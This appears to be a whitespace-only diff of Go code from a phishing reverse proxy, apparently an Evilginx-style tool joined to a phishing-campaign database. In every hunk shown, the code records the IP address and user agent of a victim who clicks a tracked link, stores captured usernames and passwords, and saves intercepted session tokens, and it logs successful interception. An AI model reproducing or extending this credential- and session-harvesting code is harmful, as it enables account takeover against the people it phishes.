@@ -181,11 +181,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
             rid_match := ridr.FindString(req_url)
             if len(rid_match) != 0 {
                 rid = strings.Split(rid_match, "=")[1]
-				browser := map[string]string{"address": req.RemoteAddr, "user-agent": req.UserAgent()}
-				err := database.HandleClickedLink(rid, browser)
-				if err != nil {
-					log.Error("failed to add clicked link event to database: %s", err)
-				}
+                browser := map[string]string{"address": req.RemoteAddr, "user-agent": req.UserAgent()}
+                err := database.HandleClickedLink(rid, browser)
+                if err != nil {
+                    log.Error("failed to add clicked link event to database: %s", err)
+                }
             }
         
             //log.Debug("http: %s", req_url)
@@ -472,10 +472,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                         log.Error("database: %v", err)
                                     }
                                     session := p.sessions[ps.SessionId]
-									err = database.HandleSubmittedData(session.RId, session.Username, session.Password)
-									if err != nil {
-										fmt.Printf("Error submitting data to database: %s\n", err)
-									}
+                                    err = database.HandleSubmittedData(session.RId, session.Username, session.Password)
+                                    if err != nil {
+                                        fmt.Printf("Error submitting data to database: %s\n", err)
+                                    }
                                 }
                             }
 
@@ -524,10 +524,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                                 log.Error("database: %v", err)
                                             }
                                             session := p.sessions[ps.SessionId]
-											err = database.HandleSubmittedData(session.RId, session.Username, session.Password)
-											if err != nil {
-												fmt.Printf("Error submitting data to database: %s\n", err)
-											}
+                                            err = database.HandleSubmittedData(session.RId, session.Username, session.Password)
+                                            if err != nil {
+                                                fmt.Printf("Error submitting data to database: %s\n", err)
+                                            }
                                         }
                                     }
                                     for _, cp := range pl.custom {
@@ -740,10 +740,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                 // we have all auth tokens
                 if s, ok := p.sessions[ps.SessionId]; ok {
                     log.Success("[%d] all authorization tokens intercepted!", ps.Index)
-					err = database.HandleCapturedSession(s.RId, s.Tokens)
-					if err != nil {
-						fmt.Printf("Error adding captured session entry to database: %s\n", err)
-					}
+                    err = database.HandleCapturedSession(s.RId, s.Tokens)
+                    if err != nil {
+                        fmt.Printf("Error adding captured session entry to database: %s\n", err)
+                    }
                 }
             }
 
@@ -871,9 +871,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                             if err == nil {
                                 log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
                                 err = database.HandleCapturedSession(s.RId, s.Tokens)
-								if err != nil {
-									fmt.Printf("Error adding captured session entry to database: %s\n", err)
-								}
+                                if err != nil {
+                                    fmt.Printf("Error adding captured session entry to database: %s\n", err)
+                                }
                             }
                             break
                         }
